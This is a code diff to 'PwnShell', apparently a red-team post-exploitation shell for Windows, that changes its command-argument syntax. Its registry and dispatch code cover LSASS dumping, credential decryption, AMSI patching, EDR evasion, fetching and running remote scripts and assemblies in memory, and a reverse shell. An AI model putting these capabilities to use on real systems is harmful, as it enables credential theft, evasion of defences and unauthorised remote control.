@@ -118,33 +118,33 @@ COMMAND_REGISTRY = {
         "!module [list|run <name>]": "Extensible module & plugin subsystem",
         "!loot": "View organized credentials & artifacts",
         "!opsec [stealth|balanced|aggressive|hybrid-cloud]": "Toggle execution jitter & profile",
-        "!playbook [--list|--run <name>]": "Declarative red team playbook runner",
+        "!playbook [list|run <name>|run --file PATH]": "Declarative red team playbook runner",
     },
     "Identity & Active Directory Assessment": {
-        "!adcs [-q|--template <T>|--ca <CA>|--wsus]": "ADCS CA/template/ACL & WSUS triage",
-        "!kerberos [--roast|--asrep|--dmsa|--diamond]": "Kerberos exposure, RBCD and dMSA triage",
-        "!entra [-s]": "Entra join-state and cloud-cache inventory",
-        "!creds [--vault|--dpapi|--decrypt B64|--history|--browser|--lsa] [--lsa-output PATH]": "Credential artifacts, DPAPI unprotect & LSASS dump",
-        "!laps [-a|--encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
-        "!acl [--target <T>|--tier0]": "Active Directory DACL & privilege escalation scout",
-        "!token [--list|--privs]": "Process token inventory & privilege audit",
-        "!bloodhound [-c <methods>]": "AD graph reconnaissance summary",
-        "!lateral [--subnet <s>]": "Bounded subnet and service scout",
+        "!adcs [--quick] [--template <T>] [--ca <CA>] [--alt SAN] [--wsus]": "ADCS CA/template/ACL & WSUS triage",
+        "!kerberos [roast|asrep|rbcd|dmsa|diamond]": "Kerberos exposure, RBCD and dMSA triage",
+        "!entra [full]": "Entra join-state and cloud-cache inventory",
+        "!creds [vault|dpapi|decrypt B64|history|browser|lsa] [--lsa-output PATH]": "Credential artifacts, DPAPI unprotect & LSASS dump",
+        "!laps [all|encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
+        "!acl [tier0] [--target <T>]": "Active Directory DACL & privilege escalation scout",
+        "!token [list|privs]": "Process token inventory & privilege audit",
+        "!bloodhound [--collection <methods>]": "AD graph reconnaissance summary",
+        "!lateral [--subnet <s>] [--ports P] [--probe-auth]": "Bounded subnet and service scout",
     },
     "Collection, Runtime & In-Memory Execution": {
         "!vss [sam|ntds] [--drive C:]": "WMI VSS hive/database staging (SAM/NTDS)",
-        "!coerce --listener <IP> [--method webdav|smb|all]": "Outbound UNC authentication probe",
-        "!evasion [--edr|--amsi|--etw]": "Runtime AMSI/ETW patch & EDR scout",
-        "!adtriage [-q]": "AD post-auth quick triage",
-        "!shares [-q] [HOST..]": "SMB share permission mapper",
-        "!sessions [-q]": "Logon sessions & network snapshot",
+        "!coerce [webdav|smb|all] --listener <IP> [--port N]": "Outbound UNC authentication probe",
+        "!evasion [edr|amsi|etw]": "Runtime AMSI/ETW patch & EDR scout",
+        "!adtriage [--quick]": "AD post-auth quick triage",
+        "!shares [--quick] [HOST..]": "SMB share permission mapper",
+        "!sessions [--quick]": "Logon sessions & network snapshot",
         "!sysinfo": "Quick OS / AV / hotfix snapshot",
         "!download RPATH [LPATH]": "Pull file/dir (dirs -> ZIP)",
-        "!upload [-xor] LPATH [RPATH]": "Push file (-xor for stealth)",
+        "!upload [--xor] LPATH [RPATH]": "Push file (--xor for stealth)",
         "!amsi": "Patch AmsiScanBuffer in-process (polymorphic)",
-        "!psrun [-xor] URL": "Load & exec remote PS1",
-        "!netrun [-xor] URL [ARG..]": "Load & exec remote .NET assembly",
-        "!noconsolation [--capture-output|--detached] [--native|--managed] [--remote] [--timeout SEC] SOURCE [ARG..]": "Run managed/native PE from memory",
+        "!psrun [--xor] URL": "Load & exec remote PS1",
+        "!netrun [--xor] URL [ARG..]": "Load & exec remote .NET assembly",
+        "!noconsolation [native|managed] [--capture-output|--detached] [--remote] [--timeout SEC] SOURCE [ARG..]": "Run managed/native PE from memory",
         "!revshell IP PORT": "Raw Winsock reverse shell",
         "!log / !stoplog": "Toggle session transcript",
         "exit / quit / Ctrl+D": "Close session",
@@ -693,7 +693,7 @@ class PwnShell:
     def _adtriage_dispatch(self, args):
         parsed = split_args(args)
         if any(arg not in {"-q", "--quick"} for arg in parsed):
-            self.write_warning("Usage: !adtriage [-q|--quick]")
+            self.write_warning("Usage: !adtriage [--quick]")
             return {"status": "error"}
         return self.adtriage(quick=bool(parsed))
 
@@ -729,7 +729,7 @@ class PwnShell:
     def _sessions_dispatch(self, args: str):
         parsed = split_args(args)
         if any(arg not in {"-q", "--quick"} for arg in parsed):
-            self.write_warning("Usage: !sessions [-q|--quick]")
+            self.write_warning("Usage: !sessions [--quick]")
             return {"status": "error"}
         return self.sessions(quick=bool(parsed))
 
@@ -768,19 +768,19 @@ class PwnShell:
 
     # ── !amsi (FIX-04) ────────────────────────────────────────────────────────
     def amsi_bypass(self):
-        return self.module_mgr.get_module("evasion").run(self, ["--amsi"])
+        return self.module_mgr.get_module("evasion").run(self, ["amsi"])
 
     # ── !psrun ────────────────────────────────────────────────────────────────
     def psrun(self, cmdline: str):
         args = split_args(cmdline)
         if not args:
-            self.write_warning("usage: !psrun [-xor] URL_OR_REMOTE_PATH")
+            self.write_warning("usage: !psrun [--xor] URL_OR_REMOTE_PATH")
             return {"status": "error"}
-        use_xor = args[0].lower() == "-xor"
+        use_xor = args[0].lower() in {"--xor", "-xor"}
         if use_xor:
             args = args[1:]
         if len(args) != 1:
-            self.write_warning("usage: !psrun [-xor] URL_OR_REMOTE_PATH")
+            self.write_warning("usage: !psrun [--xor] URL_OR_REMOTE_PATH")
             return {"status": "error"}
         source = args[0]
         if source.lower().startswith(("http://", "https://")):
@@ -808,11 +808,11 @@ try {{
     def netrun(self, cmdline: str):
         args = split_args(cmdline)
         if not args:
-            self.write_warning("usage: !netrun [-xor] URL_OR_REMOTE_PATH [ARG..]")
+            self.write_warning("usage: !netrun [--xor] URL_OR_REMOTE_PATH [ARG..]")
             return {"status": "error"}
-        if args[0].lower() == "-xor":
+        if args[0].lower() in {"--xor", "-xor"}:
             if len(args) == 1:
-                self.write_warning("usage: !netrun [-xor] URL_OR_REMOTE_PATH [ARG..]")
+                self.write_warning("usage: !netrun [--xor] URL_OR_REMOTE_PATH [ARG..]")
                 return {"status": "error"}
             use_xor = True
             args    = args[1:]
@@ -1214,7 +1214,7 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
     def noconsolation(self, cmdline: str):
         args = split_args(cmdline)
         usage = (
-            "usage: !noconsolation [--capture-output] [--native|--managed] "
+            "usage: !noconsolation [native|managed] [--capture-output] "
             "[--remote] [--detached] [--timeout SEC] SOURCE [ARG..]"
         )
         if not args:
@@ -1241,10 +1241,10 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                     detached = True
                 elif arg == "--remote":
                     remote_source = True
-                elif arg in {"--native", "--managed"}:
-                    chosen = arg[2:]
+                elif arg in {"native", "managed", "--native", "--managed"}:
+                    chosen = arg.removeprefix("--")
                     if mode and mode != chosen:
-                        raise ValueError("choose only one of --native or --managed")
+                        raise ValueError("choose only one of native or managed")
                     mode = chosen
                 elif arg == "--timeout":
                     idx += 1
@@ -1281,7 +1281,7 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
 
         source, argv = args[idx], args[idx + 1:]
         if remote_source and not mode:
-            self.write_warning("--remote requires an explicit --native or --managed mode.")
+            self.write_warning("--remote requires an explicit native or managed mode.")
             return {"status": "error", "error": "remote payload mode is ambiguous"}
 
         effective_timeout = timeout if timeout is not None else (60 if capture_output else 0)
@@ -1292,9 +1292,9 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
             selected_mode = mode or ("managed" if pe_info.managed else "native")
             if selected_mode == "managed":
                 if not remote_source and not pe_info.managed:
-                    raise NoConsolationError("--managed was selected but the PE has no CLR header")
+                    raise NoConsolationError("managed mode was selected but the PE has no CLR header")
                 if any((method, unicode_method, link_to_peb, dont_unload, load_all_dependencies)):
-                    raise NoConsolationError("native loader options cannot be combined with --managed")
+                    raise NoConsolationError("native loader options cannot be combined with managed mode")
                 if remote_source:
                     # Read bytes only inside the remote runspace, then reuse the
                     # same managed runner without touching operator disk.
@@ -1307,7 +1307,7 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                     if len(payload) > self._max_memory_execution_size():
                         raise NoConsolationError("remote managed payload exceeds PWNRM_MAX_EXEC")
                     if not inspect_pe(payload).managed:
-                        raise NoConsolationError("remote --managed payload has no CLR header")
+                        raise NoConsolationError("remote managed payload has no CLR header")
                 return self._run_managed_memory(
                     payload,
                     argv,
@@ -1359,7 +1359,7 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
             self.write_warning(usage)
             return {"status": "error", "error": "missing Ligolo-ng agent"}
 
-        forwarded = ["--detached", "--native"]
+        forwarded = ["--detached", "native"]
         if remote:
             forwarded.append("--remote")
         forwarded.extend(args)
@@ -1404,15 +1404,15 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
     def upload(self, cmdline: str):
         args = split_args(cmdline)
         if not args:
-            self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return {"status": "error"}
-        if args[0].lower() == "-xor":
+            self.write_warning("usage: !upload [--xor] LPATH [RPATH]"); return {"status": "error"}
+        if args[0].lower() in {"--xor", "-xor"}:
             unxor = False; args = args[1:]
             if not args:
-                self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return {"status": "error"}
+                self.write_warning("usage: !upload [--xor] LPATH [RPATH]"); return {"status": "error"}
         else:
             unxor = True
         if len(args) not in (1, 2):
-            self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return {"status": "error"}
+            self.write_warning("usage: !upload [--xor] LPATH [RPATH]"); return {"status": "error"}
         src = Path(args[0])
         dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
         try:
